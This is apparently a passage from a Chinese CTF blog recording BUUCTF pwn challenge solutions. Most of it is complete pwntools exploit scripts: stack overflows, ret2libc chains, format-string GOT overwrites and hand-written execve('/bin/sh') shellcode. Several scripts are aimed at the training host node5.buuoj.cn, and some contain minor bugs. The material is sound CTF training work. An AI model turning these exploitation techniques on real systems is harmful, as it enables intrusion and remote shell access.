<p>主可以看到在<code>0x400A54</code>位置处有一个<code>call rax</code>指令，那么我们将rax修改为后门函数的地址就可以了（默认你找到那个后门函数了）</p>
<img src="./images/image-20250216002324164.png" alt="image-20250216002324164" style="zoom:80%;" />

<p>可以在<code>0x400A89</code>位置处发现rax的值由<code>var_18</code>确定，那么去找一下<code>var_18</code>在哪里</p>
<img src="./images/image-20250216002503305.png" alt="image-20250216002503305" style="zoom:80%;" />

<p>有的，兄弟，有的…</p>
<p>从<code>s</code>处（ebp-0x60)开始，到<code>var_18</code>(ebp-0x18),再除去已经输入的密码<code>2jctf_pa5sw0rd\x00</code>(0xe长度),我们需要填充的数据量为<code>0x60 - 0x18 - 0xe = 0x3a</code></p>
<p>所以exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25872</span>)</span><br><span class="line">backdoor = <span class="number">0x400e88</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x3a</span>+p64(backdoor))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="56-picoctf-2018-shellcode"><a href="#56-picoctf-2018-shellcode" class="headerlink" title="56 picoctf_2018_shellcode"></a>56 picoctf_2018_shellcode</h2><p><em><strong>ret2shellcode</strong></em></p>
<p>题比较简单，尝试了一下盲打</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">❯ ./pwn</span><br><span class="line">Enter a string!</span><br><span class="line">aaaaaa</span><br><span class="line">aaaaaa</span><br><span class="line">Thanks! Executing now...</span><br><span class="line">[1]    2462 segmentation fault  ./pwn</span><br></pre></td></tr></table></figure>

<p>根据运行情况，猜测是输入相关字符串并当作函数执行，所以直接写入<code>shellcode</code>试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28483</span>)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后打通了</p>
<h2 id="57-hitcontraining-magicheap"><a href="#57-hitcontraining-magicheap" class="headerlink" title="57 hitcontraining_magicheap"></a>57 hitcontraining_magicheap</h2><p>施工中</p>
<h2 id="58-jarviso-level1"><a href="#58-jarviso-level1" class="headerlink" title="58 jarviso_level1"></a>58 jarviso_level1</h2><p>本身应该挺简单的，但是远程和本地的输出不一样</p>
<p>本地：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">0x87</span>+<span class="number">0x4</span>,<span class="string">b&#x27;b&#x27;</span>)+p32(buf_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>接受buf的地址，然后<code>ret</code>回<code>buf</code>处执行<code>shellcode</code></p>
<p>但是远程要先输入再回显，所以只能<code>ret2libc</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29446</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">main_addr=<span class="number">0x80484b7</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">0x1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(system_addr)+p32(main_addr)+ p32(bin_sh)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="59-axb-2019-fmt32"><a href="#59-axb-2019-fmt32" class="headerlink" title="59 axb 2019 fmt32"></a>59 axb 2019 fmt32</h2><p><em><strong>fmt+ret2libc</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;b&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;prinf_addr:&quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:system&#125;,wirte_size = <span class="string">&#x27;byte&#x27;</span>,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/59/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p><img src="/./images/image-20250216163343339.png" alt="image-20250216163343339"></p>
<p>在第25行有明显<code>fmt漏洞</code>,经过输入查询发现我们的输入偏移为8（但不完全是）</p>
<blockquote>
<p>gdb测试的时候发现第一个字符的输入是存放在了第7个偏移处，所以应该先填充一个字符，防止后来的地址出现问题</p>
</blockquote>
<p>在<code>printf_got</code>后面加一个<code>b&#39;b&#39;</code>为了做为<code>recvuntil()</code>的标记，泄露printf地址后就可以libc了</p>
<h2 id="60-cinscn-s-9"><a href="#60-cinscn-s-9" class="headerlink" title="60 cinscn_s_9"></a>60 cinscn_s_9</h2><p><em><strong>shellcode</strong></em></p>
<p><code>checksec</code>一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/60/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>有<code>RWX</code>段,保护全关，估计<code>shellcode</code>,ida看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [esp+8h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nHey! ^_^&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIt&#x27;s nice to meet you&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have anything to tell?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK bye~&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     esp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个<code>jmp esp</code>函数，pwn函数里存在溢出点，但总计可以读入0x32字节，不够写<code>shellcraft.sh()</code>，所以要手写</p>
<p>这边梳理一下流程</p>
<p><code>在栈上写入小shellcode-&gt;覆盖返回地址为jmp esp-&gt;让esp指向shellcode-&gt;主动调用esp</code></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor    eax, eax</span></span><br><span class="line"><span class="string">push   eax</span></span><br><span class="line"><span class="string">push   0x68732f2f</span></span><br><span class="line"><span class="string">push   0x6e69622f</span></span><br><span class="line"><span class="string">mov    ebx, esp</span></span><br><span class="line"><span class="string">mov    ecx, eax</span></span><br><span class="line"><span class="string">mov    edx, eax</span></span><br><span class="line"><span class="string">mov    al, 0xb</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">shellcode = asm(shellcode)</span></span><br><span class="line"><span class="string">payload = shellcode.ljust(0x24,b&#x27;</span>\x00<span class="string">&#x27;)+p32(0x8048554)</span></span><br><span class="line"><span class="string">payload+=asm(&#x27;</span>sub esp,<span class="number">0x28</span>;call esp<span class="string">&#x27;)	# 0x24+0x4=0x28</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8821-40%E9%A2%98%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8821-40%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-02 17:41:25" itemprop="dateModified" datetime="2025-03-02T17:41:25+08:00">2025-03-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="buuctf刷题记录（21-40题）"><a href="#buuctf刷题记录（21-40题）" class="headerlink" title="buuctf刷题记录（21-40题）"></a>buuctf刷题记录（21-40题）</h1><p>by Maple</p>
<h2 id="21-铁人三项（第五赛区-2018-rop"><a href="#21-铁人三项（第五赛区-2018-rop" class="headerlink" title="21_铁人三项（第五赛区) _2018_rop"></a>21_铁人三项（第五赛区) _2018_rop</h2><p>ret2libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27252</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc  = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(sys)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="22-bjdctf-2020-babystack2"><a href="#22-bjdctf-2020-babystack2" class="headerlink" title="22 bjdctf_2020_babystack2"></a>22 bjdctf_2020_babystack2</h2><p>看源码，发现输入长度是<code>int</code>型，而<code>read</code>读取的长度为<code>unsigned int</code>型，所以输入-1就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27683</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x400726</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="23-bjdctf-2020-babyrop"><a href="#23-bjdctf-2020-babyrop" class="headerlink" title="23 bjdctf_2020_babyrop"></a>23 bjdctf_2020_babyrop</h2><p>ret2libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26423</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;story!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;story!\n&#x27;</span>)</span><br><span class="line">sys = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(binsh)+p64(sys)+p64(main)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="24-jarviso-fm"><a href="#24-jarviso-fm" class="headerlink" title="24 jarviso_fm"></a>24 jarviso_fm</h2><p>看名字就知道是格式化字符串，x&#x3D;&#x3D;4的时候就可以getshell</p>
<p>直接找到x的地址，用自带函数就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;<span class="number">0x804a02c</span>:<span class="number">0x4</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

